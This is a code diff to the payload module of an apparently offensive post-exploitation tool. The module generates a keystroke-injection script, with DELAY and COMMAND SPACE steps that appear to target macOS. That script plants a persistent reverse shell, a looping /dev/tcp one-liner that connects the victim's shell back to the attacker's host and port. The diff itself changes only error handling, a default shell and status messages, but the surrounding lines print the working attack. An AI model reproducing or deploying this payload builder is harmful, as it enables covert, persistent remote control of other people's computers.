@@ -30,8 +30,8 @@ class payload:
 	def run(self,server):
 		while 1:
 			shell = input(h.info_general_raw("Target shell: ")).strip(" ")
-			while shell == "":
-				shell = input(h.info_general_raw("Target shell: ")).strip(" ")
+			if shell == "":
+				shell = "sh"
 			persistence = input(h.info_question_raw("Make persistent? (y/n): ")).strip(" ").lower()
 			if persistence == "y":
 				shell_command = "while true; do $("+shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
@@ -55,7 +55,9 @@ class payload:
 				h.info_error("Local directory: "+dest+": does not exist!")
 				g = os.environ['HOME']
 				os.chdir(g + "/mouse")
-				exit
+				input("Press enter to continue...").strip(" ")
+				os.system("touch .nopayload")
+				return
 		else:
 			direct = os.path.split(path)[0]
 			if direct == "":
@@ -69,13 +71,17 @@ class payload:
 					h.info_error("Error: "+direct+": not a directory!")
 					g = os.environ['HOME']
 					os.chdir(g + "/mouse")
-					exit
+					input("Press enter to continue...").strip(" ")
+					os.system("touch .nopayload")
+					return
 			else:
 				h.info_error("Local directory: "+direct+": does not exist!")
 				g = os.environ['HOME']
 				os.chdir(g + "/mouse")
-				exit
-			
+				input("Press enter to continue...").strip(" ")
+				os.system("touch .nopayload")
+				return
+		h.info_general("Creating payload...")
 		payload = """\
 DELAY 500
 COMMAND SPACE
@@ -92,6 +98,6 @@ DELAY 500"""
 		f = open(payload_save_path,"w")
 		f.write(payload)
 		f.close()
-		h.info_success("Saved to " + payload_save_path + "!")
+		h.info_info("Saved to " + payload_save_path + ".")
 		g = os.environ['HOME']
 		os.chdir(g + "/mouse")
